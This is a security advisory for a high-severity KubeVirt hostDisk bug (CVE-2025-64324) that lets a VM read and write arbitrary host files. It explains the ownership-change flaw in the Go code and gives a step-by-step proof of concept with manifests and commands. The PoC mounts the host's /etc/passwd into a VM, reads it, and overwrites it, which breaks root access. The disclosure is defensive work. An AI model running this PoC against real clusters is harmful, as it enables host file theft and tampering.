# KubeVirt Vulnerable to Arbitrary Host File Read and Write

**GHSA**: GHSA-46xp-26xh-hpqh | **CVE**: CVE-2025-64324 | **Severity**: high (CVSS 7.7)

**CWE**: CWE-123, CWE-200, CWE-732

**Affected Packages**:
- **kubevirt.io/kubevirt** (go): < 1.6.1
- **kubevirt.io/kubevirt** (go): >= 1.7.0-alpha.0, < 1.7.0-rc.0

## Description

### Summary
The `hostDisk` feature in KubeVirt allows mounting a host file or directory owned by the user with UID 107 into a VM. However, the implementation of this feature and more specifically the `DiskOrCreate` option which creates a file if it doesn't exist, has a logic bug that allows an attacker to read and write arbitrary files owned by more privileged users on the host system.


### Details
The `hostDisk` feature gate in KubeVirt allows mounting a QEMU RAW image directly from the host into a VM. While similar features, such as mounting disk images from a PVC, enforce ownership-based restrictions (e.g., only allowing files owned by specific UID, this mechanism can be subverted. For a RAW disk image to be readable by the QEMU process running within the `virt-launcher` pod, it must be owned by a user with UID 107. **If this ownership check is considered a security barrier, it can be bypassed**. In addition, the ownership of the host files mounted via this feature is changed to the user with UID 107. 

The above is due to a logic bug in the code of the `virt-handler` component which prepares and sets the permissions of the volumes and data inside which are going to be mounted in the `virt-launcher` pod and consecutively consumed by the VM. It is triggered when one tries to mount a host file or directory using the `DiskOrCreate` option. The relevant code is as follows:

```go
// pkg/host-disk/host-disk.go

func (hdc DiskImgCreator) Create(vmi *v1.VirtualMachineInstance) error {
	for _, volume := range vmi.Spec.Volumes {
		if hostDisk := volume.VolumeSource.HostDisk; shouldMountHostDisk(hostDisk) {
			if err := hdc.mountHostDiskAndSetOwnership(vmi, volume.Name, hostDisk); err != nil {
				return err
			}
		}
	}
	return nil
}

func shouldMountHostDisk(hostDisk *v1.HostDisk) bool {
	return hostDisk != nil && hostDisk.Type == v1.HostDiskExistsOrCreate && hostDisk.Path != ""
}

func (hdc *DiskImgCreator) mountHostDiskAndSetOwnership(vmi *v1.VirtualMachineInstance, volumeName string, hostDisk *v1.HostDisk) error {
	diskPath := GetMountedHostDiskPathFromHandler(unsafepath.UnsafeAbsolute(hdc.mountRoot.Raw()), volumeName, hostDisk.Path)
	diskDir := GetMountedHostDiskDirFromHandler(unsafepath.UnsafeAbsolute(hdc.mountRoot.Raw()), volumeName)
	fileExists, err := ephemeraldiskutils.FileExists(diskPath)
	if err != nil {
		return err
	}
	if !fileExists {
		if err := hdc.handleRequestedSizeAndCreateSparseRaw(vmi, diskDir, diskPath, hostDisk); err != nil {
			return err
		}
	}
	// Change file ownership to the qemu user.
	if err := ephemeraldiskutils.DefaultOwnershipManager.UnsafeSetFileOwnership(diskPath); err != nil {
		log.Log.Reason(err).Errorf("Couldn't set Ownership on %s: %v", diskPath, err)
		return err
	}
	return nil
}
```


The root cause lies in the fact that if the specified by the user file does not exist, it is created by the `handleRequestedSizeAndCreateSparseRaw` function. However, this function does not explicitly set file ownership or permissions. As a result, the logic in `mountHostDiskAndSetOwnership` proceeds to the branch marked with `// Change file ownership to the qemu user`, assuming ownership should be applied. This logic fails to account for the scenario where the file already exists and may be owned by a more privileged user. 
In such cases, changing file ownership without validating the file's origin introduces a security risk: it can unintentionally grant access to sensitive host files, compromising their integrity and confidentiality. This may also enable an **External API Attacker** to disrupt system availability.


### PoC
To demonstrate this vulnerability, the `hostDisk` feature gate should be enabled when deploying the KubeVirt stack. 

```yaml
# kubevirt-cr.yaml
apiVersion: kubevirt.io/v1
kind: KubeVirt
metadata:
  name: kubevirt
  namespace: kubevirt
spec:
  certificateRotateStrategy: {}
  configuration:
    developerConfiguration:
      featureGates:
        -  HostDisk
  customizeComponents: {}
  imagePullPolicy: IfNotPresent
  workloadUpdateStrategy: {}
```


Initially, if one tries to create a VM and mount `/etc/passwd` from the host using the `Disk` option which assumes that the file already exists, the following error is returned:

```yaml
# arbitrary-host-read-write.yaml
apiVersion: kubevirt.io/v1
kind: VirtualMachine
metadata:
  name: arbitrary-host-read-write
spec:
  runStrategy: Always
  template:
    metadata:
      labels:
        kubevirt.io/size: small
        kubevirt.io/domain: arbitrary-host-read-write
    spec:
      domain:
        devices:
          disks:
            - name: containerdisk
              disk:
                bus: virtio
            - name: cloudinitdisk
              disk:
                bus: virtio
            - name: host-disk
              disk:
                bus: virtio
          interfaces:
          - name: default
            masquerade: {}
        resources:
          requests:
            memory: 64M
      networks:
      - name: default
        pod: {}
      volumes:
        - name: containerdisk
          containerDisk:
            image: quay.io/kubevirt/cirros-container-disk-demo
        - name: cloudinitdisk
          cloudInitNoCloud:
            userDataBase64: SGkuXG4=
        - name: host-disk
          hostDisk:
            path: /etc/passwd
            type: Disk
```


```bash
# Deploy the above VM manifest
operator@minikube:~$ kubectl apply -f arbitrary-host-read-write.yaml
# Observe the deployment status
operator@minikube:~$ kubectl get vm
NAME                        AGE     STATUS             READY
arbitrary-host-read-write   7m55s   CrashLoopBackOff   False
# Inspect the reason for the `CrashLoopBackOff`
operator@minikube:~$ kubectl get vm arbitrary-host-read-write  -o jsonpath='{.status.conditions[3].message}'
server error. command SyncVMI failed: "LibvirtError(Code=1, Domain=10, Message='internal error: process exited while connecting to monitor: 2025-05-20T20:14:01.546609Z qemu-kvm: -blockdev {\"driver\":\"file\",\"filename\":\"/var/run/kubevirt-private/vmi-disks/host-disk/passwd\",\"aio\":\"native\",\"node-name\":\"libvirt-1-storage\",\"read-only\":false,\"discard\":\"unmap\",\"cache\":{\"direct\":true,\"no-flush\":false}}: Could not open '/var/run/kubevirt-private/vmi-disks/host-disk/passwd': Permission denied')"
```

The hosts's `/etc/passwd` file's owner and group are `0:0` (`root:root`) hence, when one tries to deploy the above `VirtualMachine` definition, it gets a `PermissionDenied` error because the file is not owned by the user with UID `107` (`qemu`):


```bash
# Inspect the ownership of the host's mounted `/etc/passwd` file within the `virt-launcher` pod responsible for the VM
operator@minikube:~$ kubectl exec -it virt-launcher-arbitrary-host-read-write-tjjkt -- ls -al /var/run/kubevirt-private/vmi-disks/host-disk/passwd
-rw-r--r--. 1 root root 1276 Jan 13 17:10 /var/run/kubevirt-private/vmi-disks/host-disk/passwd
```

However, if one uses the `DiskOrCreate` option, the file's ownership is silently changed to `107:107` (`qemu:qemu`) before the VM is started which allows the latter to boot, and then read and modify it.

```yaml
...
hostDisk:
            capacity: 1Gi
            path: /etc/passwd
            type: DiskOrCreate
```

```bash
# Apply the modified manifest
operator@minikube:~$ kubectl apply -f arbitrary-host-read-write.yaml
# Observe the deployment status
operator@minikube::~$ kubectl get vm
NAME                        AGE     STATUS             READY
arbitrary-host-read-write   7m55s   Running   False
# Initiate a console connection to the running VM
operator@minikube: virtctl console arbitrary-host-read-write
...
```

```bash
# Within the VM arbitrary-host-read-write, inspect the present block devices and their contents
root@arbitrary-host-read-write:~$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
vda     253:0    0   44M  0 disk
|-vda1  253:1    0   35M  0 part /
`-vda15 253:15   0    8M  0 part
vdb     253:16   0    1M  0 disk
vdc     253:32   0  1.5K  0 disk
root@arbitrary-host-read-write:~$ cat /dev/vdc
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
_rpc:x:101:65534::/run/rpcbind:/usr/sbin/nologin
systemd-network:x:102:106:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:107:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
statd:x:104:65534::/var/lib/nfs:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
docker:x:1000:999:,,,:/home/docker:/bin/bash
# Write into the block device backed up by the host's `/etc/passwd` file
root@arbitrary-host-read-write:~$ echo "Quarkslab" | tee -a /dev/vdc
```

If one inspects the file content of the host's `/etc/passwd` file, they will see that it has changed alongside its ownership:

```bash
# Inspect the contents of the file
operator@minikube:~$ cat /etc/passwd
Quarkslab
:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
_rpc:x:101:65534::/run/rpcbind:/usr/sbin/nologin
systemd-network:x:102:106:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:107:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
statd:x:104:65534::/var/lib/nfs:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
docker:x:1000:999:,,,:/home/docker:/bin/bash
# Inspect the permissions of the file
operator@minikube:~$ ls -al /etc/passwd
-rw-r--r--. 1 107 systemd-resolve 1276 May 20 20:35 /etc/passwd
# Test the integrity of the system
operator@minikube: $sudo su
sudo: unknown user root
sudo: error initializing audit plugin sudoers_audit
```

### Impact

Host files arbitrary read and write - this vulnerability it can unintentionally grant access to sensitive host files, compromising their integrity and confidentiality.
